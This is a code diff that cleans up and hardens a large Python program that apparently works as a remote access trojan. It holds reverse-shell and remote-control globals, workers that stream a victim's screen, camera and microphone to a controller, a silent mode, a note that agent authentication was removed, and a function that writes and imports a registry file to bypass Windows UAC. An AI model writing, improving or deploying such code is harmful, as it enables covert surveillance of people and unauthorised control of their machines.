@@ -371,10 +371,7 @@ REVERSE_SHELL_SOCKET = None
 REMOTE_CONTROL_ENABLED = False
 LOW_LATENCY_INPUT_HANDLER = None
 
-# System state
-SILENT_MODE = False
-DEBUG_MODE = False
-DEPLOYMENT_COMPLETED = False
+# System state (variables already defined above - removing duplicates)
 
 # Additional global variables
 DASHBOARD_HTML = None
@@ -393,7 +390,7 @@ low_latency_available = False
 
 # Clipboard and monitoring
 CHUNK = 1024
-FORMAT = None  # Will be set conditionally based on pyaudio availability
+# FORMAT already defined above based on pyaudio availability
 CHANNELS = 1
 RATE = 44100
 
@@ -451,23 +448,7 @@ WEBRTC_CONFIG = {
     }
 }
 
-# Module availability flags
-CV2_AVAILABLE = False
-NUMPY_AVAILABLE = False
-PIL_AVAILABLE = False
-PYAUDIO_AVAILABLE = False
-PYNPUT_AVAILABLE = False
-PYAUTOGUI_AVAILABLE = False
-PYGAME_AVAILABLE = False
-PSUTIL_AVAILABLE = False
-SPEECH_RECOGNITION_AVAILABLE = False
-WEBSOCKETS_AVAILABLE = False
-SOCKETIO_AVAILABLE = False
-FLASK_AVAILABLE = False
-FLASK_SOCKETIO_AVAILABLE = False
-
-# WebRTC module availability flags
-AIORTC_AVAILABLE = False
+# Module availability flags (already set above based on actual imports - removing duplicates)
 
 # Production scale configuration
 PRODUCTION_SCALE = {
@@ -475,7 +456,7 @@ PRODUCTION_SCALE = {
     'target_implementation': 'mediasoup',      # Target: mediasoup for production scale
     'migration_phase': 'planning',            # Current phase: planning
     'scalability_limits': {
-        'aiorttc_max_viewers': 50,            # aiortc suitable for smaller setups
+        'aiortc_max_viewers': 50,            # aiortc suitable for smaller setups
         'mediasoup_max_viewers': 1000,        # mediasoup for production scale
         'concurrent_agents': 100,             # Maximum concurrent agents
         'bandwidth_per_agent': 10000000       # 10 Mbps per agent
@@ -487,16 +468,7 @@ PRODUCTION_SCALE = {
         'max_packet_loss': 0.01               # 1% max packet loss
     }
 }
-AIOHTTP_AVAILABLE = False
-AIORTC_SIGNALING_AVAILABLE = False
-REQUESTS_AVAILABLE = False
-MSS_AVAILABLE = False
-HAS_DXCAM = False
-HAS_TURBOJPEG = False
-HAS_LZ4 = False
-HAS_MSGPACK = False
-HAS_XXHASH = False
-WINDOWS_AVAILABLE = False
+# Module availability flags already set above - removing duplicates
 
 def check_system_requirements():
     """
@@ -647,7 +619,6 @@ class BackgroundInitializer:
     
     def _show_progress(self):
         """Show initialization progress in real-time."""
-        import time
         dots = 0
         while not self.initialization_complete.is_set():
             status = self.get_initialization_status()
@@ -3577,7 +3548,6 @@ def stream_screen(agent_id):
 def camera_capture_worker(agent_id):
     """Capture camera frames and put in capture queue."""
     global CAMERA_STREAMING_ENABLED, camera_capture_queue
-    import time
     
     if not CV2_AVAILABLE:
         log_message("Error: OpenCV not available for camera capture", "error")
@@ -3638,7 +3608,6 @@ def camera_capture_worker(agent_id):
 def camera_encode_worker(agent_id):
     """Encode camera frames from capture queue to H.264 and put in encode queue."""
     global CAMERA_STREAMING_ENABLED, camera_capture_queue, camera_encode_queue
-    import time
     
     if not CV2_AVAILABLE:
         log_message("Error: OpenCV not available for camera encoding", "error")
@@ -3685,7 +3654,6 @@ def camera_encode_worker(agent_id):
 def camera_send_worker(agent_id):
     """Send encoded camera frames from encode queue via socket.io."""
     global CAMERA_STREAMING_ENABLED, camera_encode_queue
-    import time
     
     if sio is None:
         log_message("Error: socket.io not available for camera sending", "error")
@@ -3754,8 +3722,6 @@ audio_encode_queue = None
 def audio_capture_worker(agent_id):
     """Capture audio frames from microphone and put in capture queue."""
     global AUDIO_STREAMING_ENABLED, audio_capture_queue
-    import time
-    import pyaudio
     
     if not PYAUDIO_AVAILABLE or FORMAT is None:
         log_message("Error: PyAudio not available for audio capture", "error")
@@ -3822,7 +3788,6 @@ def audio_capture_worker(agent_id):
 def audio_encode_worker(agent_id):
     """Encode audio frames from capture queue to Opus and put in encode queue."""
     global AUDIO_STREAMING_ENABLED, audio_capture_queue, audio_encode_queue
-    import time
     
     if audio_capture_queue is None or audio_encode_queue is None:
         log_message("Error: Audio queues not initialized", "error")
@@ -3853,7 +3818,10 @@ def audio_encode_worker(agent_id):
             if encoder:
                 try:
                     # Convert PCM to Opus
-                    import numpy as np
+                    if not NUMPY_AVAILABLE:
+                        log_message("NumPy not available for audio processing", "warning")
+                        encoded_data = pcm_data  # Fallback to PCM
+                        continue
                     pcm_array = np.frombuffer(pcm_data, dtype=np.int16)
                     encoded_data = encoder.encode(pcm_array.tobytes(), CHUNK)
                 except Exception as e:
@@ -3881,7 +3849,6 @@ def audio_encode_worker(agent_id):
 def audio_send_worker(agent_id):
     """Send encoded audio frames from encode queue via socket.io."""
     global AUDIO_STREAMING_ENABLED, audio_encode_queue
-    import time
     
     if sio is None:
         log_message("Error: socket.io not available for audio sending", "error")
@@ -4741,7 +4708,7 @@ def enhanced_webrtc_monitoring():
         
         # Calculate scalability metrics
         current_usage = len(WEBRTC_PEER_CONNECTIONS)
-        max_capacity = PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers']
+        max_capacity = PRODUCTION_SCALE['scalability_limits']['aiortc_max_viewers']
         
         monitoring_data['scalability_metrics'] = {
             'current_usage': current_usage,
@@ -7438,8 +7405,10 @@ try:
     from flask_socketio import SocketIO, emit, join_room, leave_room
     
     FLASK_AVAILABLE = True
+    FLASK_SOCKETIO_AVAILABLE = True
 except ImportError:
     FLASK_AVAILABLE = False
+    FLASK_SOCKETIO_AVAILABLE = False
     log_message("Flask/SocketIO not available. Controller functionality disabled.")
 
 # Controller state
@@ -9471,31 +9440,28 @@ if __name__ == "__main__":
         try:
             if sio and hasattr(sio, 'connected') and sio.connected:
                 sio.disconnect()
-        except:
-            pass
+        except Exception as e:
+            log_message(f"Error disconnecting socket: {e}", "error")
         
         # Clear sensitive memory
         try:
             import gc
             gc.collect()
-        except:
-            pass
+        except Exception as e:
+            log_message(f"Error during garbage collection: {e}", "error")
 
 # Agent authentication removed - direct access enabled
 
 # Modern non-blocking streaming pipeline for screen streaming
 # Note: These variables are already defined in the global state section above
-# STREAMING_ENABLED, TARGET_FPS, CAPTURE_QUEUE_SIZE, ENCODE_QUEUE_SIZE are defined globally
-STREAM_THREADS = []
-capture_queue = None
-encode_queue = None
+# STREAMING_ENABLED, TARGET_FPS, CAPTURE_QUEUE_SIZE, ENCODE_QUEUE_SIZE, STREAM_THREADS, capture_queue, encode_queue are defined globally
 
 
 def screen_capture_worker(agent_id):
-    import time
     global STREAMING_ENABLED, capture_queue
-    import mss
-    import numpy as np
+    if not MSS_AVAILABLE or not NUMPY_AVAILABLE or not CV2_AVAILABLE:
+        log_message("Required modules not available for screen capture", "error")
+        return
     with mss.mss() as sct:
         monitors = sct.monitors
         monitor_index = 1
@@ -9528,6 +9494,9 @@ def screen_capture_worker(agent_id):
 
 def screen_encode_worker(agent_id):
     global STREAMING_ENABLED, capture_queue, encode_queue
+    if not CV2_AVAILABLE:
+        log_message("OpenCV not available for screen encoding", "error")
+        return
     while STREAMING_ENABLED:
         try:
             img = capture_queue.get(timeout=0.5)
@@ -9560,9 +9529,7 @@ def screen_send_worker(agent_id):
 
 # Documented: Modern streaming pipeline uses three threads and two queues for capture, encode, and send. Each stage is non-blocking and drops oldest frames if overloaded. FPS and buffer sizes are configurable.
 
-import os
-import subprocess
-import time
+# Note: os, subprocess, and time already imported above
 
 def write_and_import_uac_bypass_reg():
     reg_content = r'''
@@ -9587,8 +9554,8 @@ Windows Registry Editor Version 5.00
         # Clean up
         try:
             os.remove(reg_file_path)
-        except:
-            pass
+        except Exception as e:
+            log_message(f"Could not remove temporary registry file: {e}", "warning")
             
         return True
         
